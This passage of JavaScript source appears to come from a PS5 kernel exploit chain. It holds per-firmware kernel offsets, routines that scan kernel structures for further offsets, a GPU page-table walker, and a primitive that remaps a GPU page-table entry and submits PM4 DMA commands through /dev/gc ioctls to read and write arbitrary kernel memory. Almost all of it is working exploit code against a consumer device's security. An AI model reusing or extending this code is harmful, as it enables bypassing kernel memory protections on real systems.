    "8.00": offset_8_00_to_8_60,
    "8.20": offset_8_00_to_8_60,
    "8.40": offset_8_00_to_8_60,
    "8.60": offset_8_00_to_8_60,
    "9.00": offset_9_00,
    "9.05": offset_9_05_to_9_60,
    "9.20": offset_9_05_to_9_60,
    "9.40": offset_9_05_to_9_60,
    "9.60": offset_9_05_to_9_60,
    "10.00": offset_10_00_to_10_01,
    "10.01": offset_10_00_to_10_01,
};

kernel_offset = null;

function get_kernel_offset(FW_VERSION) {

    //logger.log("inside get_kernel_offset FW_VERSION: '" + FW_VERSION + "'");
    
    const offsets = ps5_kernel_offset_list[FW_VERSION];
    
    if (!offsets) {
        throw new Error("Unsupported firmware version: " + FW_VERSION);
    }
    
    kernel_offset = { ...offsets };
    
    kernel_offset.DATA_BASE_TARGET_ID = kernel_offset.DATA_BASE_SECURITY_FLAGS + 0x09n;
    kernel_offset.DATA_BASE_QA_FLAGS = kernel_offset.DATA_BASE_SECURITY_FLAGS + 0x24n;
    kernel_offset.DATA_BASE_UTOKEN_FLAGS = kernel_offset.DATA_BASE_SECURITY_FLAGS + 0x8Cn;
    
    // proc structure
    kernel_offset.PROC_FD = 0x48n;
    kernel_offset.PROC_PID = 0xbcn;
    kernel_offset.PROC_VM_SPACE = 0x200n;
    kernel_offset.PROC_COMM = -1n;
    kernel_offset.PROC_SYSENT = -1n;
    
    // filedesc
    kernel_offset.FILEDESC_OFILES = 0x8n;
    kernel_offset.SIZEOF_OFILES = 0x30n;
    
    // vmspace structure
    kernel_offset.VMSPACE_VM_PMAP = -1n;
    kernel_offset.VMSPACE_VM_VMID = -1n;
    
    // pmap structure
    kernel_offset.PMAP_CR3 = 0x28n;
    
    // gpu vmspace structure
    kernel_offset.SIZEOF_GVMSPACE = 0x100n;
    kernel_offset.GVMSPACE_START_VA = 0x8n;
    kernel_offset.GVMSPACE_SIZE = 0x10n;
    kernel_offset.GVMSPACE_PAGE_DIR_VA = 0x38n;
    
    // net
    kernel_offset.SO_PCB = 0x18n;
    kernel_offset.INPCB_PKTOPTS = 0x120n;
    
    return kernel_offset;
}

function find_vmspace_pmap_offset() {
    const vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE);
    
    // Note, this is the offset of vm_space.vm_map.pmap on 1.xx.
    // It is assumed that on higher firmwares it's only increasing'
    const cur_scan_offset = 0x1C8n;
    
    for (let i = 1; i <= 6; i++) {
        const scan_val = kernel.read_qword(vmspace + cur_scan_offset + BigInt(i * 8));
        const offset_diff = Number(scan_val - vmspace);
        
        if (offset_diff >= 0x2C0 && offset_diff <= 0x2F0) {
            return cur_scan_offset + BigInt(i * 8);
        }
    }
    
    throw new Error("failed to find VMSPACE_VM_PMAP offset");
}


function find_vmspace_vmid_offset() {
    const vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE);
    
    // Note, this is the offset of vm_space.vm_map.vmid on 1.xx.
    // It is assumed that on higher firmwares it's only increasing'
    const cur_scan_offset = 0x1D4n;
    
    for (let i = 1; i <= 8; i++) {
        const scan_offset = cur_scan_offset + BigInt(i * 4);
        const scan_val = Number(kernel.read_dword(vmspace + scan_offset));
        
        if (scan_val > 0 && scan_val <= 0x10) {
            return scan_offset;
        }
    }
    
    throw new Error("failed to find VMSPACE_VM_VMID offset");
}

function find_proc_offsets() {
    const proc_data = kernel.read_buffer(kernel.addr.curproc, 0x1000);
    
    const p_comm_sign = find_pattern(proc_data, "ce fa ef be cc bb");
    const p_sysent_sign = find_pattern(proc_data, "ff ff ff ff ff ff ff 7f");
    
    if (p_comm_sign.length === 0) {
        throw new Error("failed to find offset for PROC_COMM");
    }
    
    if (p_sysent_sign.length === 0) {
        throw new Error("failed to find offset for PROC_SYSENT");
    }
    
    const p_comm_offset = BigInt(p_comm_sign[0] + 0x8);
    const p_sysent_offset = BigInt(p_sysent_sign[0] - 0x10);
    
    return {
        PROC_COMM: p_comm_offset,
        PROC_SYSENT: p_sysent_offset
    };
}

function find_additional_offsets() {
    const proc_offsets = find_proc_offsets();
    
    const vm_map_pmap_offset = find_vmspace_pmap_offset();
    const vm_map_vmid_offset = find_vmspace_vmid_offset();
    
    return {
        PROC_COMM: proc_offsets.PROC_COMM,
        PROC_SYSENT: proc_offsets.PROC_SYSENT,
        VMSPACE_VM_PMAP: vm_map_pmap_offset,
        VMSPACE_VM_VMID: vm_map_vmid_offset,
    };
}

function update_kernel_offsets() {
    const offsets = find_additional_offsets();
    
    for (const [key, value] of Object.entries(offsets)) {
        kernel_offset[key] = value;
    }
}

/***** gpu.js *****/
// GPU page table

GPU_PDE_SHIFT = {
    VALID: 0,
    IS_PTE: 54,
    TF: 56,
    BLOCK_FRAGMENT_SIZE: 59,
};

GPU_PDE_MASKS = {
    VALID: 1n,
    IS_PTE: 1n,
    TF: 1n,
    BLOCK_FRAGMENT_SIZE: 0x1fn,
};

GPU_PDE_ADDR_MASK = 0x0000ffffffffffc0n;

function gpu_pde_field(pde, field) {
    const shift = GPU_PDE_SHIFT[field];
    const mask = GPU_PDE_MASKS[field];
    return (pde >> BigInt(shift)) & mask;
}

function gpu_walk_pt(vmid, virt_addr) {
    const pdb2_addr = get_pdb2_addr(vmid);
    
    const pml4e_index = (virt_addr >> 39n) & 0x1ffn;
    const pdpe_index = (virt_addr >> 30n) & 0x1ffn;
    const pde_index = (virt_addr >> 21n) & 0x1ffn;
    
    // PDB2
    const pml4e = kernel.read_qword(pdb2_addr + pml4e_index * 8n);
    
    if (gpu_pde_field(pml4e, "VALID") !== 1n) {
        return null;
    }
    
    // PDB1
    const pdp_base_pa = pml4e & GPU_PDE_ADDR_MASK;
    const pdpe_va = phys_to_dmap(pdp_base_pa) + pdpe_index * 8n;
    const pdpe = kernel.read_qword(pdpe_va);
    
    if (gpu_pde_field(pdpe, "VALID") !== 1n) {
        return null;
    }
    
    // PDB0
    const pd_base_pa = pdpe & GPU_PDE_ADDR_MASK;
    const pde_va = phys_to_dmap(pd_base_pa) + pde_index * 8n;
    const pde = kernel.read_qword(pde_va);
    
    if (gpu_pde_field(pde, "VALID") !== 1n) {
        return null;
    }
    
    if (gpu_pde_field(pde, "IS_PTE") === 1n) {
        return [pde_va, 0x200000n]; // 2MB
    }
    
    // PTB
    const fragment_size = gpu_pde_field(pde, "BLOCK_FRAGMENT_SIZE");
    const offset = virt_addr & 0x1fffffn;
    const pt_base_pa = pde & GPU_PDE_ADDR_MASK;
    
    let pte_index, pte;
    let pte_va, page_size;
    
    if (fragment_size === 4n) {
        pte_index = offset >> 16n;
        pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
        pte = kernel.read_qword(pte_va);
        
        if (gpu_pde_field(pte, "VALID") === 1n && gpu_pde_field(pte, "TF") === 1n) {
            pte_index = (virt_addr & 0xffffn) >> 13n;
            pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
            page_size = 0x2000n; // 8KB
        } else {
            page_size = 0x10000n; // 64KB
        }
    } else if (fragment_size === 1n) {
        pte_index = offset >> 13n;
        pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
        page_size = 0x2000n; // 8KB
    }
    
    return [pte_va, page_size];
}

// Kernel r/w primitives based on GPU DMA

gpu = {};

gpu.dmem_size = 2n * 0x100000n; // 2MB
gpu.fd = null; // GPU device file descriptor

// Direct ioctl helper functions

gpu.build_command_descriptor = function(gpu_addr, size_in_bytes) {
    // Each descriptor is 16 bytes (2 qwords)
    
    const desc = malloc(16);
    const size_in_dwords = BigInt(size_in_bytes) >> 2n;
    
    // First qword: (gpu_addr_low32 << 32) | 0xC0023F00
    const qword0 = ((gpu_addr & 0xFFFFFFFFn) << 32n) | 0xC0023F00n;
    
    // Second qword: (size_in_dwords << 32) | (gpu_addr_high16)
    const qword1 = ((size_in_dwords & 0xFFFFFn) << 32n) | ((gpu_addr >> 32n) & 0xFFFFn);
    
    write64_uncompressed(desc, qword0);
    write64_uncompressed(desc + 8n, qword1);
    
    return desc;
};

gpu.ioctl_submit_commands = function(pipe_id, cmd_count, cmd_descriptors_ptr) {
    // ioctl 0xC0108102
    // Structure: [dword pipe_id][dword count][qword cmd_buf_ptr]
    
    const submit_struct = malloc(0x10);
    write32_uncompressed(submit_struct + 0x0n, BigInt(pipe_id));
    write32_uncompressed(submit_struct + 0x4n, BigInt(cmd_count));
    write64_uncompressed(submit_struct + 0x8n, cmd_descriptors_ptr);
    
    const ret = syscall(SYSCALL.ioctl, gpu.fd, 0xC0108102n, submit_struct);
    if (ret !== 0n) {
        throw new Error("ioctl submit failed: " + hex(ret));
    }
};

// may be not needed...
gpu.ioctl_gpu_sync = function() {
    // ioctl 0xC0048117
    // Structure: [dword value] (set to 0)
    
    const sync_struct = malloc(0x4);
    write32_uncompressed(sync_struct, 0n);
    
    const ret = syscall(SYSCALL.ioctl, gpu.fd, 0xC0048117n, sync_struct);

};

gpu.ioctl_wait_done = function() {
    // ioctl 0xC0048116
    // Structure: [dword value] (set to 0)
    
    const wait_struct = malloc(0x4);
    write32_uncompressed(wait_struct, 0n);
    
    const ret = syscall(SYSCALL.ioctl, gpu.fd, 0xC0048116n, wait_struct);
    
    // We just ignore error lol
    //if (ret !== 0n) {
    //    throw new Error("ioctl wait_done failed: " + hex(ret));
    //}
    
    // Manual sleep - temp fix
    nanosleep(1000000000);
};

gpu.setup = function() {
    check_kernel_rw();
    
    // Open GPU device directly
    gpu.fd = syscall(SYSCALL.open, alloc_string("/dev/gc"), O_RDWR);
    if (gpu.fd === 0xffffffffffffffffn) {
        throw new Error("Failed to open /dev/gc");
    }
    
    const prot_ro = PROT_READ | PROT_WRITE | GPU_READ;
    const prot_rw = prot_ro | GPU_WRITE;
    
    const victim_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE);
    const transfer_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE);
    const cmd_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE);
    
    const curproc_cr3 = get_proc_cr3(kernel.addr.curproc);
    const victim_real_pa = virt_to_phys(victim_va, curproc_cr3);
    
    const result = get_ptb_entry_of_relative_va(victim_va);
    if (!result) {
        throw new Error("failed to setup gpu primitives");
    }
    
    const [victim_ptbe_va, page_size] = result;
    
    if (!victim_ptbe_va || page_size !== gpu.dmem_size) {
        throw new Error("failed to setup gpu primitives");
    }
    
    if (syscall(SYSCALL.mprotect, victim_va, gpu.dmem_size, prot_ro) === 0xffffffffffffffffn) {
        throw new Error("mprotect() error");
    }
    
    const initial_victim_ptbe_for_ro = kernel.read_qword(victim_ptbe_va);
    const cleared_victim_ptbe_for_ro = initial_victim_ptbe_for_ro & (~victim_real_pa);
    
    gpu.victim_va = victim_va;
    gpu.transfer_va = transfer_va;
    gpu.cmd_va = cmd_va;
    gpu.victim_ptbe_va = victim_ptbe_va;
    gpu.cleared_victim_ptbe_for_ro = cleared_victim_ptbe_for_ro;
};

gpu.pm4_type3_header = function(opcode, count) {
    
    const packet_type = 3n;
    const shader_type = 1n;  // compute shader
    const predicate = 0n;    // predicate disable
    
    const result = (
        (predicate & 0x0n) |                      // Predicated version of packet when set
        ((shader_type & 0x1n) << 1n) |            // 0: Graphics, 1: Compute Shader
        ((opcode & 0xffn) << 8n) |        // IT opcode
        (((count - 1n) & 0x3fffn) << 16n) |  // Number of DWORDs - 1 in the information body
        ((packet_type & 0x3n) << 30n)             // Packet identifier. It should be 3 for type 3 packets
    );
    
    return result & 0xFFFFFFFFn;
};

gpu.pm4_dma_data = function(dest_va, src_va, length) {
    const count = 6n;
    const bufsize = Number(4n * (count + 1n));
    const opcode = 0x50n;
    const command_len = BigInt(length) & 0x1fffffn;
    
    const pm4 = malloc(bufsize);
    
    const dma_data_header = (
        (0n & 0x1n) |                    // engine
        ((0n & 0x1n) << 12n) |           // src_atc
        ((2n & 0x3n) << 13n) |           // src_cache_policy
        ((1n & 0x1n) << 15n) |           // src_volatile
        ((0n & 0x3n) << 20n) |           // dst_sel (DmaDataDst enum)
        ((0n & 0x1n) << 24n) |           // dst_atc
        ((2n & 0x3n) << 25n) |           // dst_cache_policy
        ((1n & 0x1n) << 27n) |           // dst_volatile
        ((0n & 0x3n) << 29n) |           // src_sel (DmaDataSrc enum)
        ((1n & 0x1n) << 31n)             // cp_sync
    ) & 0xFFFFFFFFn;
    
    write32_uncompressed(pm4, gpu.pm4_type3_header(opcode, count)); // pm4 header
    write32_uncompressed(pm4 + 0x4n, dma_data_header); // dma data header (copy: mem -> mem)
    write32_uncompressed(pm4 + 0x8n, src_va & 0xFFFFFFFFn);
    write32_uncompressed(pm4 + 0xcn, src_va >> 32n);
    write32_uncompressed(pm4 + 0x10n, dest_va & 0xFFFFFFFFn);
    write32_uncompressed(pm4 + 0x14n, dest_va >> 32n);
    write32_uncompressed(pm4 + 0x18n, command_len);
    
    return read_buffer(pm4, bufsize);
};

gpu.submit_dma_data_command = function(dest_va, src_va, size) {
    // Prep command buf
    const dma_data = gpu.pm4_dma_data(dest_va, src_va, size);
    write_buffer(gpu.cmd_va, dma_data);
    
    // Build command descriptor manually
    const desc = gpu.build_command_descriptor(gpu.cmd_va, dma_data.length);
    
    const pipe_id = 0;
    
    gpu.ioctl_gpu_sync();
    
    // Submit to gpu via direct ioctl
    gpu.ioctl_submit_commands(pipe_id, 1, desc);
    
    gpu.ioctl_gpu_sync();
    
    // Wait for completion
    gpu.ioctl_wait_done();
};

gpu.transfer_physical_buffer = function(phys_addr, size, is_write) {
    const trunc_phys_addr = phys_addr & ~(gpu.dmem_size - 1n);
    const offset = phys_addr - trunc_phys_addr;
    
    if (offset + BigInt(size) > gpu.dmem_size) {
        throw new Error("error: trying to write more than direct memory size: " + size);
    }
    
    const prot_ro = PROT_READ | PROT_WRITE | GPU_READ;
    const prot_rw = prot_ro | GPU_WRITE;
    
    // Remap PTD
    if (syscall(SYSCALL.mprotect, gpu.victim_va, gpu.dmem_size, prot_ro) === 0xffffffffffffffffn) {
        throw new Error("mprotect() error");
    }
    
    const new_ptb = gpu.cleared_victim_ptbe_for_ro | trunc_phys_addr;
    kernel.write_qword(gpu.victim_ptbe_va, new_ptb);
    
    if (syscall(SYSCALL.mprotect, gpu.victim_va, gpu.dmem_size, prot_rw) === 0xffffffffffffffffn) {
        throw new Error("mprotect() error");
    }
    
    let src, dst;
    
    if (is_write) {
        src = gpu.transfer_va;
        dst = gpu.victim_va + offset;
    } else {
        src = gpu.victim_va + offset;
        dst = gpu.transfer_va;
    }
    
    // Do the DMA operation
    gpu.submit_dma_data_command(dst, src, size);
};

gpu.read_buffer = function(addr, size) {
    const phys_addr = virt_to_phys(addr, kernel.addr.kernel_cr3);
    if (!phys_addr) {
        throw new Error("failed to translate " + hex(addr) + " to physical addr");
    }
    
    gpu.transfer_physical_buffer(phys_addr, size, false);
    return read_buffer(gpu.transfer_va, size);
};

gpu.write_buffer = function(addr, buf) {
    const phys_addr = virt_to_phys(addr, kernel.addr.kernel_cr3);
    if (!phys_addr) {
        throw new Error("failed to translate " + hex(addr) + " to physical addr");
    }
    
    write_buffer(gpu.transfer_va, buf); // prepare data for write
    gpu.transfer_physical_buffer(phys_addr, buf.length, true);
};

gpu.read_byte = function(kaddr) {
    const value = gpu.read_buffer(kaddr, 1);
    return value && value.length === 1 ? BigInt(value[0]) : null;
};

gpu.read_word = function(kaddr) {
    const value = gpu.read_buffer(kaddr, 2);
    if (!value || value.length !== 2) return null;
    return BigInt(value[0]) | (BigInt(value[1]) << 8n);
};

gpu.read_dword = function(kaddr) {
    const value = gpu.read_buffer(kaddr, 4);
    if (!value || value.length !== 4) return null;
    let result = 0n;
    for (let i = 0; i < 4; i++) {
        result |= (BigInt(value[i]) << BigInt(i * 8));
    }
    return result;
};

gpu.read_qword = function(kaddr) {
    const value = gpu.read_buffer(kaddr, 8);
    if (!value || value.length !== 8) return null;
    let result = 0n;
    for (let i = 0; i < 8; i++) {
        result |= (BigInt(value[i]) << BigInt(i * 8));
    }
    return result;
};

gpu.write_byte = function(dest, value) {
    const buf = new Uint8Array(1);
    buf[0] = Number(value & 0xFFn);
    gpu.write_buffer(dest, buf);
};

gpu.write_word = function(dest, value) {
    const buf = new Uint8Array(2);
    buf[0] = Number(value & 0xFFn);
    buf[1] = Number((value >> 8n) & 0xFFn);
    gpu.write_buffer(dest, buf);
};

gpu.write_dword = function(dest, value) {
    const buf = new Uint8Array(4);
    for (let i = 0; i < 4; i++) {
        buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
    }
    gpu.write_buffer(dest, buf);
};

gpu.write_qword = function(dest, value) {
    const buf = new Uint8Array(8);
    for (let i = 0; i < 8; i++) {
        buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
    }
    gpu.write_buffer(dest, buf);
};

// Misc functions

function alloc_main_dmem(size, prot, flag) {
    if (!size || prot === null || prot === undefined) {
        throw new Error("alloc_main_dmem: size and prot are required");
    }
    
    const out = malloc(8);
    const mem_type = 1n;
    
    const size_big = typeof size === "bigint" ? size : BigInt(size);
    const prot_big = typeof prot === "bigint" ? prot : BigInt(prot);
    const flag_big = typeof flag === "bigint" ? flag : BigInt(flag);
    
    const ret = call(sceKernelAllocateMainDirectMemory, size_big, size_big, mem_type, out);
    if (ret !== 0n) {
        throw new Error("sceKernelAllocateMainDirectMemory() error: " + hex(ret));
    }
    
    const phys_addr = read64_uncompressed(out);
    write64_uncompressed(out, 0n);
    
    // Dummy name
    const name_buf = alloc_string("mem");
    
    //const ret2 = call(sceKernelMapNamedDirectMemory, out, size_big, prot_big, flag_big, phys_addr, size_big, name_buf);
    const ret2 = call(sceKernelMapDirectMemory, out, size_big, prot_big, flag_big, phys_addr, size_big);
    if (ret2 !== 0n) {
        //throw new Error("sceKernelMapNamedDirectMemory() error: " + hex(ret2));
        throw new Error("sceKernelMapDirectMemory() error: " + hex(ret2));
    }
    
    return read64_uncompressed(out);
}

function get_curproc_vmid() {
    const vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE);
    const vmid = kernel.read_dword(vmspace + kernel_offset.VMSPACE_VM_VMID);
    return Number(vmid);
}

function get_gvmspace(vmid) {
    if (vmid === null || vmid === undefined) {
        throw new Error("vmid is required");
    }
    const vmid_big = typeof vmid === "bigint" ? vmid : BigInt(vmid);
    const gvmspace_base = kernel.addr.data_base + kernel_offset.DATA_BASE_GVMSPACE;
    return gvmspace_base + vmid_big * kernel_offset.SIZEOF_GVMSPACE;
}

function get_pdb2_addr(vmid) {
    const gvmspace = get_gvmspace(vmid);
    return kernel.read_qword(gvmspace + kernel_offset.GVMSPACE_PAGE_DIR_VA);
}

function get_relative_va(vmid, va) {
    if (typeof va !== "bigint") {
        throw new Error("va must be BigInt");
    }
    
    const gvmspace = get_gvmspace(vmid);
    
    const size = kernel.read_qword(gvmspace + kernel_offset.GVMSPACE_SIZE);
    const start_addr = kernel.read_qword(gvmspace + kernel_offset.GVMSPACE_START_VA);
    const end_addr = start_addr + size;
    
    if (va >= start_addr && va < end_addr) {
        return va - start_addr;
    }
    
    return null;
}

function get_ptb_entry_of_relative_va(virt_addr) {
    const vmid = get_curproc_vmid();
    const relative_va = get_relative_va(vmid, virt_addr);
    
    if (!relative_va) {
        throw new Error("invalid virtual addr " + hex(virt_addr) + " for vmid " + vmid);
    }
    
    return gpu_walk_pt(vmid, relative_va);
}